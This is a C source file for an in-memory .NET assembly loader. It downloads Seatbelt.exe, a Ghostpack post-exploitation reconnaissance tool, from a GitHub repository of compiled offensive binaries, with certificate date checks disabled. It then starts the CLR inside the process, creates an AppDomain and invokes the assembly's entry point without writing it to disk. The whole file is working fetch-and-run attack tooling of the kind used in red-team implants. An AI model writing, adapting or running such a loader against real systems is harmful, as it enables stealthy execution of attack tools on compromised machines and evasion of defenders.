#include "interfaces.h"
#include "clr.h"
#include <WinInet.h>
#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "wininet.lib")

Lock = FALSE;

BOOL ExecuteAssembly( PBYTE AssemblyBuffer, DWORD AssemblySize, AppDomain* pAppDomain, ICorRuntimeHost* pICorRuntimeHost, ICLRGCManager* pICLRGCManager, int argc, PWCHAR argv[] ) {

    HRESULT        hr                  = S_OK;
    Assembly*      pAssembly           = NULL;
    MethodInfo*    pMethodInfo         = NULL;
    VARIANT        vtPsa               = { 0 };
    SAFEARRAYBOUND rgsabound[1]        = { 0 };
    SAFEARRAY*     pSafeArray          = NULL;
    PVOID          pvData              = NULL;
    VARIANT        retVal              = { 0 };
    VARIANT        obj                 = { 0 };
    long           idx[1]              = { 0 };
    SAFEARRAY*     psaStaticMethodArgs = NULL;

    ZeroMemory( &retVal, sizeof( VARIANT ) );
    ZeroMemory( &obj, sizeof( VARIANT ) );

    // Prep SafeArray
    rgsabound[0].cElements = AssemblySize;
    rgsabound[0].lLbound = 0;
    pSafeArray   = SafeArrayCreate( VT_UI1, 1, rgsabound );
    SafeArrayAccessData( pSafeArray, &pvData );
    memcpy( pvData, AssemblyBuffer, AssemblySize );

    // Prep AppDomain and EntryPoint
    hr = pAppDomain->lpVtbl->Load_3( pAppDomain, pSafeArray, &pAssembly );
    if ( hr != S_OK ) {
        printf( "[-] Process refusing to load AppDomain: 0x%llx\n", hr );
        return 0;
    }
    hr = pAssembly->lpVtbl->EntryPoint( pAssembly, &pMethodInfo );
    if ( hr != S_OK ) {
        printf( "[-] Process refusing to find entry point of assembly.\n" );
        return 0;
    }

    SafeArrayUnaccessData( pSafeArray );

    // Something
    obj.vt       = VT_NULL;

    // Change cElement to the number of Main arguments
    psaStaticMethodArgs = SafeArrayCreateVector( VT_VARIANT, 0, (ULONG)1 );//Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()
    vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
    vtPsa.parray = SafeArrayCreateVector( VT_BSTR, 0, argc - 1 );
    for ( int i = 0; i < argc - 1; i++ ) {
        SafeArrayPutElement( vtPsa.parray, &i, SysAllocString( argv[ i + 1 ] ) ); // bud is NOT getting freed 
    }
    // Insert an array of BSTR into the VT_VARIANT psaStaticMethodArgs array
    SafeArrayPutElement( psaStaticMethodArgs, idx, &vtPsa );

    //Invoke our .NET Method
    hr = pMethodInfo->lpVtbl->Invoke_3( pMethodInfo, obj, psaStaticMethodArgs, &retVal );

    if ( hr == S_OK ) {
        printf( "Assembly executed successfully\n" );
        // clean up our appdomain. DOES NOT ACTUALLY CLEAR OUR ASSEMBLY FROM MEMORY THOUGH
        hr = pICorRuntimeHost->lpVtbl->UnloadDomain( pICorRuntimeHost, pAppDomain );
        if ( hr == S_OK ) {
            hr = pICLRGCManager->lpVtbl->Collect(pICLRGCManager, -1);
            if ( hr != S_OK ){
                printf( "We could not force garbage collection\n" );
            }
        }
        else {
            printf( "We could not unload the AppDomain\n" );
        }
    }

    // Free the safearray stuff
    SafeArrayDestroy(pSafeArray);
    VariantClear(&retVal);
    VariantClear(&obj);
    VariantClear(&vtPsa);

    return 1;
}
BOOL StartCLR( 
    LPCWSTR dotNetVersion, 
    OUT ICLRMetaHost** ppClrMetaHost, 
    OUT ICLRRuntimeInfo** ppClrRuntimeInfo, 
    OUT ICorRuntimeHost** ppICorRuntimeHost, 
    OUT ICLRRuntimeHost** ppICLRRuntimeHost, 
    OUT ICLRControl** ppICLRControl, 
    OUT ICLRGCManager** ppICLRGCManager,
    OUT AppDomain** ppAppDomain ) {

    //Declare variables
    HRESULT hr = NULL;

    //Get the CLRMetaHost that tells us about .NET on this machine
    hr = CLRCreateInstance (&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, ppClrMetaHost );

    if ( hr == S_OK )
    {
        //Get the runtime information for the particular version of .NET
        hr = (*ppClrMetaHost)->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo );
        if ( hr == S_OK )
        {
            /*Check if the specified runtime can be loaded into the process. This method will take into account other runtimes that may already be
            loaded into the process and set fLoadable to TRUE if this runtime can be loaded in an in-process side-by-side fashion.*/
            BOOL fLoadable;
            hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable );
            if ( ( hr == S_OK ) && fLoadable )
            {
              
                //Load the CLR into the current process and return a runtime interface pointer.
                hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface( *ppClrRuntimeInfo, &CLSID_CLRRuntimeHost, &IID_ICLRRuntimeHost, ppICLRRuntimeHost );
                if ( hr == S_OK )
                {
                    MyHostControl* pMyHostControl  = NULL;
                    IUnknown*      pAppDomainThunk = NULL;
                   
                    // Set our custom thingy
                    pMyHostControl = NewMyHostControl();
                    hr = (*ppICLRRuntimeHost)->lpVtbl->SetHostControl( *ppICLRRuntimeHost, pMyHostControl );
                    if ( hr == S_OK )
                    {
                        // Get the GCManager interface so we can actually free stuff after unloading the appdomain via forcing GC
                        (*ppICLRRuntimeHost)->lpVtbl->GetCLRControl( *ppICLRRuntimeHost, ppICLRControl );
                        (*ppICLRControl)->lpVtbl->GetCLRManager( *ppICLRControl, &IID_ICLRGCManager, ppICLRGCManager );

                        // Start it
                        (*ppICLRRuntimeHost)->lpVtbl->Start(*ppICLRRuntimeHost);

                        // Apparently you can load COR Runtime after you start ICLRRuntime
                        hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, ppICorRuntimeHost );
                        if ( hr == S_OK )
                        {
                            hr = (*ppICorRuntimeHost)->lpVtbl->CreateDomain( *ppICorRuntimeHost, L"yay", NULL, &pAppDomainThunk );
                            if ( hr == S_OK )
                            {
                                hr = pAppDomainThunk->lpVtbl->QueryInterface( pAppDomainThunk, &xIID_AppDomain, ppAppDomain );
                                if ( hr == S_OK )
                                {
                                    return 1;
                                }
                                else
                                {
                                    printf( "[-] We could not query the AppDomain interface: 0x%llx\n", hr );
                                    return 0;
                                }
                            }
                            else
                            {
                                printf( "[-] We could not create our own AppDomain: 0x%llx\n", hr );
                                return 0;
                            }
                        }
                        else
                        {
                            printf( "[-] We could not get ICorRuntimeHost: 0x%llx\n", hr );
                            return 0;
                        }
                    }
                    else
                    {
                        printf( "[-] We could not set our own HostControl: 0x%llx\n", hr );
                        return 0;
                    }
                }
                else
                {
                    //If CLR fails to load fail gracefully
                    printf( "[-] Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion );
                    return 0;
                }
            }
            else
            {
                //If CLR fails to load fail gracefully
                printf( "[-] Process refusing to load %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion );
                return 0;
            }
        }
        else
        {
            //If CLR fails to load fail gracefully
            printf( "[-] Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion );
            return 0;
        }
    }
    else
    {
        //If CLR fails to load fail gracefully
        printf( "[-] Process refusing to create %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion );
        return 0;
    }

    //CLR loaded successfully
    return 1;
}

BOOL FindVersion( PVOID assembly, DWORD64 length ) {
    PBYTE assembly_c;
    assembly_c = assembly;
    char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

    for ( DWORD64 i = 0; i < length; i++ )
    {
        for ( DWORD64 j = 0; j < 10; j++ )
        {
            if ( v4[ j ] != assembly_c[ i + j ] )
            {
                break;
            }
            else
            {
                if ( j == 9 )
                {
                    return 1;
                }
            }
        }
    }

    return 0;
}

PBYTE DownloadAssembly( PCHAR url, OUT PDWORD AssemblySize ) {

    CHAR buffer[1024];
    PVOID ReturnAddress  = NULL;
    HINTERNET hInternet  = NULL;
    HINTERNET hFile      = NULL;
    DWORD bytesRead      = 0;
    DWORD fileSize       = 0;
    LPVOID fileData      = NULL;
    PBYTE AssemblyBuffer = NULL;

    hInternet = InternetOpenA( NULL, NULL, NULL, NULL, NULL );

    hFile     = InternetOpenUrlA( hInternet, url, NULL, NULL, (INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE), NULL );
    while ( InternetReadFile( hFile, buffer, (DWORD64)1024, &bytesRead ) != 0 ) {
        if ( bytesRead == 0 ) break;
        fileSize += bytesRead;
    }

    hFile          = InternetOpenUrlA( hInternet, url, NULL, NULL, (INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE), NULL );
    AssemblyBuffer = malloc( fileSize );

    InternetReadFile( (PVOID)hFile, AssemblyBuffer, (DWORD64)fileSize, &bytesRead );

    InternetCloseHandle( hFile );
    InternetCloseHandle( hInternet );

    *AssemblySize = fileSize;
    return AssemblyBuffer;
}
void wmain( int argc, PWCHAR argv[] ) {

    CHAR  url[]          = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe";
    PBYTE AssemblyBuffer = NULL;
    DWORD AssemblySize   = 0;

    AssemblyBuffer       = DownloadAssembly( url, &AssemblySize);

    LPCWSTR          NetVersion       = NULL;
    ICLRMetaHost*    pClrMetaHost     = NULL;
    ICLRRuntimeInfo* pClrRuntimeInfo  = NULL;
    ICorRuntimeHost* pICorRuntimeHost = NULL;
    ICLRRuntimeHost* pICLRRuntimeHost = NULL;
    ICLRControl*     pICLRControl     = NULL;
    ICLRGCManager*   pICLRGCManager   = NULL;
    AppDomain*       pAppDomain       = NULL;
    if ( FindVersion( AssemblyBuffer, AssemblySize) )
    {
        NetVersion = L"v4.0.30319";
    }
    else
    {
        NetVersion = L"v2.0.50727";
    }
    StartCLR( NetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost, &pICLRRuntimeHost, &pICLRControl, &pICLRGCManager, &pAppDomain );

    // Prep SafeArray 
    ExecuteAssembly( AssemblyBuffer, AssemblySize, pAppDomain, pICorRuntimeHost, pICLRGCManager, argc, argv );

    // Free the downloaded assembly
    ZeroMemory( AssemblyBuffer, AssemblySize);
    free( AssemblyBuffer );

    getchar();
}